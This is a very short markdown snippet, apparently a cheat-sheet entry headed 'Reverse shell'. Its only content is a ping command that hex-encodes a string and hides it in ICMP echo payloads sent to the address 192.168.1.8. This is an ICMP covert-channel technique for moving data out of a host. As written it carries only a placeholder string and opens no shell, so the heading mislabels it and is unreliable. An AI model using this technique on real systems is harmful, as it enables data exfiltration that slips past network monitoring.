# Reverse shell
```
ping -p$(echo 'abcdefghijklmnop' | hexdump -e '"%02X"') 192.168.1.8
```
